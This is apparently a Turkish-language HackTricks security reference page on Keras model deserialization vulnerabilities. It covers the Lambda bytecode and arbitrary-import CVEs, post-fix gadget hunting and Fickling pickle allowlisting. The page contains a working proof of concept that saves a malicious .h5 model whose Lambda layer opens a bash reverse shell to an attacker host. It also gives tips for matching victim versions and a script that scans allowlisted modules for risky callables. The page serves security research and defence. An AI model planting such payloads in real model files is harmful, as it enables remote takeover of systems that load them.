# Keras Model Serileştirme Çözme RCE’si ve Gadget Hunting

{{#include ../banners/hacktricks-training.md}}

Bu sayfada Keras model serileştirme çözme hattına yönelik pratik exploitation teknikleri özetlenir, yerel .keras formatının iç yapısı ve saldırı yüzeyi açıklanır ve Model File Vulnerabilities (MFV’ler) ile düzeltme sonrası gadget’ları bulmaya yönelik bir araştırmacı araç seti sunulur.

## .keras model formatının iç yapısı

Bir .keras dosyası, en az şunları içeren bir ZIP arşividir:<sup>[[1]](#references)</sup>
- metadata.json – genel bilgiler (ör. Keras sürümü)
- config.json – model mimarisi (birincil saldırı yüzeyi)
- model.weights.h5 – HDF5 biçimindeki ağırlıklar

config.json, özyinelemeli serileştirme çözme işlemini yürütür: Keras modülleri içe aktarır, sınıfları/fonksiyonları çözümler ve saldırgan denetimindeki sözlüklerden katmanları/nesneleri yeniden oluşturur.<sup>[[1]](#references)</sup>

Dense katman nesnesi için örnek bir kod parçası:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserialization şu işlemleri gerçekleştirir:<sup>[[1]](#references)</sup>
- `module`/`class_name` anahtarlarından modül içe aktarma ve sembol çözümleme
- Saldırganın kontrolündeki `kwargs` ile `from_config(...)` veya constructor çağrısı
- İç içe nesnelerin (activations, initializers, constraints vb.) özyinelemeli olarak işlenmesi

Tarihsel olarak bu durum, `config.json` hazırlayan bir saldırgana üç primitive sağlıyordu:<sup>[[1]](#references)</sup>
- Hangi modüllerin içe aktarılacağını kontrol etme
- Hangi sınıf/fonksiyonların çözümleneceğini kontrol etme
- Constructor/`from_config` içine aktarılan `kwargs` değerlerini kontrol etme

## CVE-2024-3660 – Lambda-layer bytecode RCE

Kök neden:
- Eski Lambda deserialization, saldırganın kontrolündeki marshaled koddan bir Python fonksiyonunu yeniden oluşturuyordu: `func_load()` payload'ı base64'ten çözüyor, `marshal.loads()` çağrısı yapıyor ve bir `FunctionType` oluşturuyordu. Ortaya çıkan fonksiyon, Lambda çağrıldığında çalışıyordu ve etkilenen 2.13 öncesi loader'lar, eski formatlar için safe-mode kontrollerini uygulamıyordu.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Yerel bir Keras v3 arşivinde Lambda fonksiyonu, `code` alanı base64 ile kodlanmış marshaled kod içeren bir `__lambda__` nesnesi olarak gösterilir:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Azaltma:
- Keras, yerel Keras v3 biçiminde varsayılan olarak `safe_mode=True` uygular. `Lambda` içindeki serileştirilmiş Python lambda'ları, kullanıcı `safe_mode=False` ile açıkça devre dışı bırakmadıkça engellenir; bu koruma eski biçimleri aynı şekilde kapsamaz.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notlar:
- Eski biçimler (önceki HDF5 kayıtları) veya eski kod tabanları modern kontrolleri uygulamayabilir; bu nedenle kurbanlar eski loader'ları kullandığında “downgrade” tarzı saldırılar hâlâ geçerli olabilir.

## CVE-2025-1550 – Keras 3.0.0–3.8.x sürümlerinde rastgele modül import etme

Temel neden:
- `_retrieve_class_or_fn`, `config.json` içindeki saldırgan denetimindeki modül dizelerinde `importlib.import_module(module)` kullanıyordu.
- Etki: Hazırlanmış bir `.keras` arşivi, `safe_mode=True` olsa bile `Model.load_model()` işlevinin saldırganın seçtiği Python modüllerini ve işlevlerini, import sırasında oluşan yan etkiler ve saldırgan denetimindeki argümanlarla import etmesine neden olabilirdi.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit fikri:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Güvenlik iyileştirmeleri (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Modül allowlist'i: içe aktarımlar resmi ekosistem modülleriyle sınırlandırılmıştır: keras, keras_hub, keras_cv, keras_nlp
- Varsayılan safe mode: safe_mode=True, güvenli olmayan Lambda serileştirilmiş işlev yüklemesini engeller
- Temel tür denetimi: serileştirmeden çıkarılan nesneler beklenen türlerle eşleşmelidir

## Pratik istismar: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Eski TensorFlow-Keras kurulumları hâlâ HDF5 model dosyalarını (`.h5`) kabul ediyor olabilir. Bir saldırgan, sunucunun daha sonra yükleyeceği veya çıkarım için çalıştıracağı bir modeli yükleyebiliyorsa, güvenlik açığı bulunan bir yükleyici saldırganın kontrolündeki Python kodunu içeren bir Lambda katmanını serileştirmeden çıkarabilir; bu kod da uygulamanın model iş akışı sırasında çalıştırılabilir.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Hedef modeli çalıştırdığında reverse shell başlatan kötü amaçlı bir .h5 oluşturmak için minimal PoC:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Notlar ve güvenilirlik ipuçları:
- Tetikleme noktaları biçime ve iş akışına göre değişir; referans verilen write-up, prediction sırasında payload’ın iki kez çalıştığını gözlemledi. Yan etkilerin tekrarlanabileceğini varsayın ve payload’ları idempotent hâle getirin.<sup>[[7]](#references)</sup>
- Sürüm sabitleme: Serialization uyuşmazlıklarını önlemek için kurbanın TF/Keras/Python sürümleriyle eşleşin. Örneğin hedef Python 3.8 ve TensorFlow 2.13.1 kullanıyorsa artifact’leri bunlarla oluşturun.<sup>[[7]](#references)</sup>
- Hızlı ortam çoğaltma:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Doğrulama: `os.system("ping -c 1 YOUR_IP")` gibi zararsız bir payload, reverse shell'e geçmeden önce çalıştırmayı doğrulamaya yardımcı olur (ör. `tcpdump` ile ICMP trafiğini gözlemleyin).<sup>[[7]](#references)</sup>

## Düzeltme sonrası allowlist içindeki gadget yüzeyi

Keras modül allowlist'i ve safe mode kullanılsa bile izin verilen callable'lar yan etkilere yol açabilir. Örneğin, `keras.utils.get_file` bir URL'den dosya indirip yapılandırılan önbellek konumuna yazar; bu da onu gadget analizi için aday hâline getirir.<sup>[[1]](#references)[[19]](#references)</sup>

Aday Lambda yapılandırması (çağrı imzasını kontrollü bir testte doğrulayın):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Önemli sınırlama:
- `Lambda.call()` model girdisini her zaman ilk konumsal argüman olarak, yapılandırılmış `arguments` değerini ise keyword argümanları olarak geçirir. `get_file` için bu konumsal değer `fname` alanını doldurur; tensor/path uyuşmazlığı, herhangi bir indirme gerçekleşmeden bu adayın başarısız olmasına neden olabilir. Bu nedenle bu, çalışması garanti bir gadget değildir.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML modelleri için ML pickle import izin listesi (Fickling)

Birçok AI/ML model biçimi (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifact'ları ve diğer Python-native biçimler) Python pickle verisi içerir. Yukarıdaki eski Keras Lambda yolu bunun yerine marshal edilmiş işlev bytecode'u kullanır; dolayısıyla bu ayrı bir deserialization riskidir. Pickle opcode'ları, modelin kurcalanması veya RCE dahil olmak üzere deserialization sırasında saldırganın denetimindeki davranışları tetikleyebilir ve basit tarayıcılar yeni ya da listelenmemiş tehlikeli import'ları gözden kaçırabilir.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Pratik bir fail-closed savunma, Python'ın pickle deserializer'ını hook'layıp unpickling sırasında yalnızca incelenmiş, zararsız ML ile ilgili import'lara izin vermektir. Trail of Bits'in Fickling aracı bu politikayı uygular ve herkese açık binlerce Hugging Face pickle'ından oluşturulmuş, özenle derlenmiş bir ML import izin listesiyle birlikte gelir.<sup>[[8]](#references)[[13]](#references)</sup>

“Güvenli” import'lar için güvenlik modeli (araştırma ve uygulamadan çıkarılan sezgiler): Bir pickle tarafından kullanılan import edilmiş semboller aynı anda şu koşulların tümünü karşılamalıdır:<sup>[[8]](#references)</sup>
- Kod çalıştırmamalı veya çalıştırılmasına neden olmamalı (derlenmiş/kaynak kod nesneleri, shell komutu çalıştırma, hook'lar vb. olmamalı)
- Keyfi nitelikleri veya öğeleri almamalı/ayarlamamalı
- Pickle VM'den diğer Python nesnelerine import yapmamalı veya bunlara referans almamalı
- Dolaylı yoldan bile olsa ikincil deserializer'ları tetiklememeli (örn. marshal, iç içe pickle)

Framework'lerin yaptığı pickle yüklemelerinin (torch.load, joblib.load vb.) denetlenmesi için Fickling korumalarını süreç başlangıcında olabildiğince erken etkinleştirin:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Operasyonel ipuçları:
- Gerektiğinde hook’ları geçici olarak devre dışı bırakıp yeniden etkinleştirebilirsiniz:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Bilinen güvenli bir model engelleniyorsa, sembolleri gözden geçirdikten sonra ortamınız için allowlist'i genişletin:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling, daha ayrıntılı kontrol tercih ederseniz genel amaçlı runtime guard'lar da sunar:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() tüm pickle.load() çağrılarında kontrolleri zorunlu kılar
  - with fickling.check_safety(): kapsamla sınırlı uygulama için
  - fickling.load(path) / fickling.is_likely_safe(path) tek seferlik kontroller için

- Mümkün olduğunda pickle dışı model formatlarını tercih edin (ör. SafeTensors).<sup>[[15]](#references)</sup> pickle kabul etmeniz gerekiyorsa, loader'ları en az ayrıcalıkla, ağ çıkışı olmadan çalıştırın ve allowlist'i zorunlu kılın.

Bu allowlist öncelikli strateji, uyumluluğu yüksek tutarken yaygın ML pickle exploit yollarını etkili biçimde engeller. ToB'nin benchmark'ında Fickling, sentetik kötü amaçlı dosyaların %100'ünü işaretledi ve en popüler Hugging Face depolarındaki temiz dosyaların yaklaşık %99'una izin verdi.<sup>[[8]](#references)[[10]](#references)</sup>


## Araştırmacı araç seti

1) İzin verilen modüllerde sistematik gadget keşfi

keras, keras_nlp, keras_cv, keras_hub genelindeki olası çağrılabilir öğeleri listeleyin ve dosya/ağ/süreç/ortam üzerinde yan etkileri olanlara öncelik verin.<sup>[[1]](#references)</sup>

<details>
<summary>Allowlist'teki Keras modüllerinde potansiyel olarak tehlikeli çağrılabilir öğeleri listeleyin</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Doğrudan deserialization testi (.keras arşivi gerekmez)

Kabul edilen parametreleri öğrenmek ve yan etkileri gözlemlemek için hazırlanmış dict'leri doğrudan Keras deserializer'larına verin.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Sürümler arası yoklama ve biçimler

Keras, farklı koruma önlemlerine ve biçimlere sahip birden fazla kod tabanında/dönemde bulunur:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (eski, silinmesi planlanıyor)
- tf-keras: ayrı olarak bakımı yapılıyor
- Multi-backend Keras 3 (resmi): yerel .keras biçimini kullanıma sundu

Regresyonları veya eksik korumaları ortaya çıkarmak için testleri farklı kod tabanlarında ve biçimlerde (.keras ile eski HDF5) tekrarlayın.

## References

- [1] [Keras Model Deserialization'da Güvenlik Açıklarının Araştırılması (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Serileştirmeye kontroller eklendi](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr raporu – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr raporu – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE ile root erişimi](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling'in yeni AI/ML pickle file scanner'ı](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML ortamlarının güvenliğini sağlama (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus'u](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle saldırılarının arka planı](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors projesi](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers rastgele kod enjeksiyonuna izin veriyor](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer kaynak kodu (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities kaynak kodu (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API'si](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../banners/hacktricks-training.md}}
